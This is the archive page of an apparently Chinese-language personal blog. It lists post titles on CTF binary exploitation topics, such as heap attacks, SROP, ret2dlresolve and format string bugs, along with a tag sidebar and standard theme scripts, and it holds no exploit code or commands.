        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 36
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2022 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/06</span>
            <a class="archive-post-title" href="/2022/07/06/srop%E4%BE%8B%E9%A2%98/">srop例题</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/03</span>
            <a class="archive-post-title" href="/2022/07/03/0ctf_2018_babystack/">[Untitled Post]</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/02</span>
            <a class="archive-post-title" href="/2022/07/02/ret2dlresolve_x64/">ret2dlresolve_x64</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/29</span>
            <a class="archive-post-title" href="/2022/04/29/dl-runtime-resolve/">ret2dl-resolve</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/24</span>
            <a class="archive-post-title" href="/2022/04/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/">延迟绑定</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/22</span>
            <a class="archive-post-title" href="/2022/04/22/houseofAtum/">BCTF2018 House of Atum</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/20</span>
            <a class="archive-post-title" href="/2022/04/20/gundam/">HITBCTF2018 gundam</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/19</span>
            <a class="archive-post-title" href="/2022/04/19/IDA%20pro/">IDA pro创建结构体</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/18</span>
            <a class="archive-post-title" href="/2022/04/18/examination/">examination</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/17</span>
            <a class="archive-post-title" href="/2022/04/17/LCTF2018%20PWN%20easy_heap/">LCTF2018 easy_heap</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/08</span>
            <a class="archive-post-title" href="/2022/04/08/tcache/">tcache</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/07</span>
            <a class="archive-post-title" href="/2022/04/07/libc-2.26/">libc 2.26</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/04</span>
            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">03/19</span>
            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span>
            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/16</span>
            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/15</span>
            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/15</span>
            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/13</span>
            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/12</span>
            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/09</span>
            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> Invalid date </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">Invalid date</span>
            <a class="archive-post-title" href="/2022/05/14/IO_FILE/">_IO_FILE</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2022 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/07</span>
            <a class="archive-post-title" href="/2022/04/07/house-of-storm/">house of storm</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/08</span>
            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> Invalid date </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">Invalid date</span>
            <a class="archive-post-title" href="/2022/04/25/srop/">srop</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> Invalid date </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">Invalid date</span>
            <a class="archive-post-title" href="/2022/05/07/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">非栈上的格式化字符串漏洞</a>
        </li>
    
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
        
            <span class="sidebar-tag-name" data-tags="tcache">
                <span class="iconfont-archer">&#xe606;</span>
                tcache
            </span>
        
            <span class="sidebar-tag-name" data-tags="os">
                <span class="iconfont-archer">&#xe606;</span>
                os
            </span>
        
            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
                <span class="iconfont-archer">&#xe606;</span>
                unsorted bin attack
            </span>
        
            <span class="sidebar-tag-name" data-tags="house of spirit">
                <span class="iconfont-archer">&#xe606;</span>
                house of spirit
            </span>
        
            <span class="sidebar-tag-name" data-tags="pwn">
                <span class="iconfont-archer">&#xe606;</span>
                pwn
            </span>
        
            <span class="sidebar-tag-name" data-tags="fastbin doule free">
                <span class="iconfont-archer">&#xe606;</span>
                fastbin doule free
            </span>
        
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="Diary">
            <span class="iconfont-archer">&#xe60a;</span>
            Diary
        </span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMeta = {
        root: "/",
        author: "John Doe"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->


        <!-- main func -->
        <script src="/scripts/main.js?v=20210823"></script>
        <!-- dark mode -->
        <script src="/scripts/dark.js?v=20210823"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
        <!-- algolia -->
        
        <!-- busuanzi -->
        
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        
        <!-- CNZZ -->
        
        <!-- async load share.js -->
        
            <script src="/scripts/share.js?v=20210823" async></script>
        
        <!-- mermaid -->
        
    </body>
</html>
